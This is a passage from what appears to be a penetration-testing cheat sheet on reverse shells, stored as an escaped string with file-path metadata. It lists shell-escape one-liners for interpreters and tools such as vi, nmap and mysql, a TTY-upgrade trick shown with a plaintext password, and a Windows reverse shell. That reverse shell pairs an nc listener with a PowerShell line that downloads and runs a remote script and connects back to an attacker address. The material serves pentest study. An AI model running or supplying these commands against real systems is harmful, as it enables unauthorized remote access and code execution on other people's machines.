  \ \"/bin/sh\";'\nperl: exec \"/bin/sh\";\nperl -e 'print `/bin/bash`'\nruby: exec \"/bin/sh\"\nlua: os.execute('/bin/sh')\n\
  ```\n\n* vi: `:!bash`\n* vi: `:set shell=/bin/bash:shell`\n* nmap: `!sh`\n* mysql: `! bash`\n\nAlternative TTY method\n\n\
  ```ps1\nwww-data@debian:/dev/shm$ su - user\nsu: must be run from a terminal\n\nwww-data@debian:/dev/shm$ /usr/bin/script\
  \ -qc /bin/bash /dev/null\nwww-data@debian:/dev/shm$ su - user\nPassword: P4ssW0rD\n\nuser@debian:~$ \n```\n\n## Fully interactive\
  \ reverse shell on Windows\n\nThe introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows\
  \ handles terminals.\n\n**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole).\
  \ This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**\n\nServer Side:\n\
  \n```ps1\nstty raw -echo; (stty size; cat) | nc -lvnp 3001\n```\n\nClient Side:\n\n```ps1\nIEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1\
  \ -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001\n```\n\nOffline version of the ps1 available at --> [antonioCoco/ConPtyShell/Invoke-ConPtyShell.ps1](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1)\n\
  \n## References\n\n* [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)\n\
  * [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\n\
  * [Spawning a TTY Shell](http://netsec.ws/?p=337)\n* [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)"
_relative_path: cheatsheets/shell-reverse-cheatsheet.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cheatsheets/shell-reverse-cheatsheet.md
````
